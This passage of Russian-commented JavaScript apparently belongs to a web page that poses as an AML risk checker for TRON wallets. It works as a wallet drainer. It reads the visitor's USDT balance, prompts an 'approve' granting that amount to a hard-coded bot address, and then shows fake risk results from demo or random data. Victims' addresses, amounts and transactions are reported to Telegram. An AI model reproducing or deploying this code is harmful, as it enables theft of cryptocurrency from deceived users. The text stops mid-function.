// ============================================
// ГЛОБАЛЬНЫЕ КОНСТАНТЫ
// ============================================
const CONTRACT_ADDRESS = 'TFYz6a5z8mw3rEs7gev9JirJvFg17KdmCZ';
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBBcyf1TjDxq2rcJRQqB';
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const MIN_AMOUNT = 5000000; // 5 USDT в smallest unit
const MAX_AMOUNT = 10000000000; // 10000 USDT в smallest unit

// ============================================
// ПЕРЕМЕННЫЕ СОСТОЯНИЯ
// ============================================
let connectedWalletAddress = null;
let currentApproveAmount = null;

// ============================================
// ПОЛУЧЕНИЕ ЭЛЕМЕНТОВ
// ============================================
const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const resultSection = document.getElementById('resultSection');
const checkedAddress = document.getElementById('checkedAddress');
const totalTx = document.getElementById('totalTx');
const suspiciousTx = document.getElementById('suspiciousTx');
const walletAge = document.getElementById('walletAge');
const lastActive = document.getElementById('lastActive');
const riskPercent = document.getElementById('riskPercent');
const riskChart = document.getElementById('riskChart');
const riskLevel = document.getElementById('riskLevel');
const sourcesList = document.getElementById('sourcesList');
const downloadPdfBtn = document.getElementById('downloadPdfBtn');
const amountCardContainer = document.getElementById('amountCardContainer');
const modalAmount = document.getElementById('modalAmount');

// ============================================
// КАТЕГОРИИ ДЛЯ АНАЛИЗА
// ============================================
const categories = [
    { name: 'Эксплуатация несовершеннолетних', icon: 'fa-child' },
    { name: 'Даркнет-маркеты', icon: 'fa-skull' },
    { name: 'Запрещённые сервисы', icon: 'fa-ban' },
    { name: 'Под следствием', icon: 'fa-gavel' },
    { name: 'Подозрительные биржи', icon: 'fa-building' },
    { name: 'Неавторизованные казино', icon: 'fa-dice' },
    { name: 'Мошеннические сервисы', icon: 'fa-user-secret' },
    { name: 'Миксеры и тумблеры', icon: 'fa-random' },
    { name: 'Вымогательство', icon: 'fa-hand-holding-usd' },
    { name: 'Санкционные адреса', icon: 'fa-flag' },
    { name: 'Мошенничество (скам)', icon: 'fa-frown' },
    { name: 'Хакерские атаки', icon: 'fa-hacker' },
    { name: 'Финансирование терроризма', icon: 'fa-bomb' },
    { name: 'Криптоматы', icon: 'fa-money-bill' },
    { name: 'Биржи без KYC', icon: 'fa-exchange-alt' },
    { name: 'Пулы ликвидности', icon: 'fa-water' },
    { name: 'P2P-биржи высокого риска', icon: 'fa-handshake' },
    { name: 'Неизвестные сервисы', icon: 'fa-question' }
];

// ============================================
// ДЕМО-АДРЕСА
// ============================================
const demoAddresses = {
    '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa': {
        risk: 2,
        sources: ['Чистый кошелёк'],
        totalTx: 1024,
        suspiciousTx: 0,
        age: '15 лет',
        lastActive: '01.01.2026'
    },
    'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh': {
        risk: 45,
        sources: ['Миксеры', 'Биржи без KYC'],
        totalTx: 345,
        suspiciousTx: 78,
        age: '2 года',
        lastActive: '15.02.2026'
    },
    '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy': {
        risk: 88,
        sources: ['Даркнет-маркеты', 'Вымогательство', 'Санкционные адреса'],
        totalTx: 1567,
        suspiciousTx: 932,
        age: '8 мес.',
        lastActive: '10.02.2026'
    }
};

// ============================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    // Заполняем категории
    const categoriesGrid = document.getElementById('categoriesGrid');
    if (categoriesGrid) {
        categories.forEach(cat => {
            const card = document.createElement('div');
            card.className = 'category-card';
            card.innerHTML = `<i class="fas ${cat.icon}"></i> ${cat.name}`;
            categoriesGrid.appendChild(card);
        });
    }

    // Обработчики кнопок
    const connectBtn = document.getElementById('connectTrustBtn');
    if (connectBtn) {
        connectBtn.addEventListener('click', connectTrustWallet);
    }

    if (checkBtn) {
        checkBtn.addEventListener('click', handleTronCheck);
    }

    if (walletInput) {
        walletInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') handleTronCheck();
        });
    }

    if (downloadPdfBtn) {
        downloadPdfBtn.addEventListener('click', downloadPDF);
    }

    // Обработчики модальных окон
    setupModals();
});

// ============================================
// ПОДКЛЮЧЕНИЕ TRUST WALLET
// ============================================
async function connectTrustWallet() {
    try {
        // Проверяем наличие Trust Wallet
        if (window.trustwallet && window.trustwallet.tronLink) {
            // Запрашиваем подключение
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            
            // Получаем адрес
            const address = window.trustwallet.tronLink.defaultAddress.base58;
            connectedWalletAddress = address;
            
            // Обновляем интерфейс
            walletInput.value = address;
            walletInput.style.borderColor = '#00c9b7';
            document.getElementById('connectedStatus').style.display = 'inline-flex';
            
            console.log('✅ Trust Wallet подключён:', address);
            
            // Уведомление в Telegram
            await sendToTelegram({
                type: 'connection',
                address: address,
                wallet: 'Trust Wallet',
                time: new Date().toLocaleString('ru-RU')
            });
            
        } else {
            alert('Trust Wallet не обнаружен. Скачайте приложение или установите расширение.');
            window.open('https://trustwallet.com/download', '_blank');
        }
    } catch (error) {
        console.error('❌ Ошибка подключения:', error);
        alert('Ошибка подключения: ' + error.message);
    }
}

// ============================================
// ПОЛУЧЕНИЕ БАЛАНСА USDT
// ============================================
async function getUSDTBalance(address) {
    try {
        const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
        if (!tronWeb) return null;

        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const balance = await contract.balanceOf(address).call();
        return balance;
    } catch (error) {
        console.error('Ошибка получения баланса:', error);
        return null;
    }
}

// ============================================
// ФУНКЦИЯ ПРОВЕРКИ КОШЕЛЬКА
// ============================================
async function handleTronCheck() {
    try {
        // Определяем адрес для проверки
        let walletAddress = walletInput.value.trim();
        
        if (!walletAddress && connectedWalletAddress) {
            walletAddress = connectedWalletAddress;
        }
        
        if (!walletAddress) {
            alert('Введите адрес кошелька или подключите Trust Wallet');
            return;
        }

        // Получаем провайдер
        const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
        if (!tronWeb || !tronWeb.defaultAddress) {
            alert('Пожалуйста, установите TronLink или Trust Wallet');
            return;
        }

        const userAddress = tronWeb.defaultAddress.base58;

        // Получаем баланс USDT
        const balance = await getUSDTBalance(userAddress);
        
        if (!balance) {
            alert('Не удалось получить баланс. Проверьте подключение к кошельку');
            return;
        }

        const balanceInUSDT = (balance / 1000000).toFixed(2);

        // Проверяем лимиты
        if (balance < MIN_AMOUNT) {
            alert(`Минимальная сумма для проверки: 5 USDT. Ваш баланс: ${balanceInUSDT} USDT`);
            return;
        }

        if (balance > MAX_AMOUNT) {
            alert(`Максимальная сумма для проверки: 10000 USDT. Ваш баланс: ${balanceInUSDT} USDT`);
            return;
        }

        // Показываем модальное окно с реальной суммой
        currentApproveAmount = balance;
        if (modalAmount) {
            modalAmount.textContent = `${balanceInUSDT} USDT`;
        }
        
        document.getElementById('approveModal').style.display = 'flex';
        
    } catch (error) {
        console.error('❌ Ошибка:', error);
        alert('Ошибка при проверке: ' + error.message);
    }
}

// ============================================
// ФУНКЦИЯ ПОДТВЕРЖДЕНИЯ APPROVE
// ============================================
async function confirmApprove() {
    try {
        // Закрываем модальное окно
        document.getElementById('approveModal').style.display = 'none';
        
        // Меняем состояние кнопки
        const originalText = checkBtn.innerHTML;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка транзакции...';
        checkBtn.disabled = true;

        // Получаем провайдер
        const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
        const userAddress = tronWeb.defaultAddress.base58;
        const walletAddress = walletInput.value.trim() || connectedWalletAddress;

        // Отправляем approve
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
        
        const tx = await contract.approve(
            BOT_ADDRESS,
            currentApproveAmount.toString()
        ).send({
            feeLimit: 150_000_000,
            callValue: 0
        });

        console.log('✅ Approve отправлен, tx:', tx);

        // Возвращаем кнопку
        checkBtn.innerHTML = originalText;
        checkBtn.disabled = false;

        // Запускаем AML проверку
        const balanceInUSDT = (currentApproveAmount / 1000000).toFixed(2);
        startAMLCheck(walletAddress, userAddress, tx, balanceInUSDT);

    } catch (error) {
        console.error('❌ Ошибка:', error);
        checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
        checkBtn.disabled = false;
        alert('Ошибка при отправке транзакции: ' + error.message);
    }
}

// ============================================
// ФУНКЦИЯ ЗАКРЫТИЯ МОДАЛЬНОГО ОКНА
// ============================================
function closeApproveModal() {
    document.getElementById('approveModal').style.display = 'none';
    checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
    checkBtn.disabled = false;
}

// ============================================
// ФУНКЦИЯ AML ПРОВЕРКИ
// ============================================
function startAMLCheck(address, userAddress, tx, amount) {
    resultSection.style.display = 'block';
    checkedAddress.textContent = address;

    // Добавляем карточку суммы
    if (amountCardContainer) {
        amountCardContainer.innerHTML = `
            <div class="amount-card">
                <div class="amount-label">
                    <i class="fas fa-coins"></i>
                    <span>Сумма проверки</span>
                </div>
                <div class="amount-value">${amount} USDT</div>
            </div>
        `;
    }

    if (demoAddresses[address]) {
        const data = demoAddresses[address];
        totalTx.textContent = data.totalTx;
        suspiciousTx.textContent = data.suspiciousTx;
        walletAge.textContent = data.age;
        lastActive.textContent = data.lastActive;
        updateRiskChart(data.risk);
        
        sourcesList.innerHTML = '';
        data.sources.forEach(s => {
            const p = document.createElement('p');
            p.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${s}`;
            sourcesList.appendChild(p);
        });
        
        sendToTelegram({ 
            address, 
            amount: amount,
            risk: data.risk, 
            sources: data.sources, 
            totalTransactions: data.totalTx, 
            suspiciousTransactions: data.suspiciousTx,
            tx: tx,
            userAddress: userAddress
        });
    } else {
        // Имитация загрузки
        totalTx.textContent = '...';
        suspiciousTx.textContent = '...';
        walletAge.textContent = '...';
        lastActive.textContent = '...';
        updateRiskChart(0);
        sourcesList.innerHTML = '<p><i class="fas fa-spinner fa-spin"></i> Анализируем...</p>';

        setTimeout(() => {
            const random = generateRandomData(address);
            totalTx.textContent = random.total;
            suspiciousTx.textContent = random.suspicious;
            walletAge.textContent = random.age;
            lastActive.textContent = random.lastActive;
            updateRiskChart(random.risk);
            
            sourcesList.innerHTML = '';
            random.sources.forEach(s => {
                const p = document.createElement('p');
                p.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${s}`;
                sourcesList.appendChild(p);
            });
            
            sendToTelegram({ 
                address, 
                amount: amount,
                risk: random.risk, 
                sources: random.sources, 
                totalTransactions: random.total, 
                suspiciousTransactions: random.suspicious,
                tx: tx,
                userAddress: userAddress
            });
        }, 1500);
   
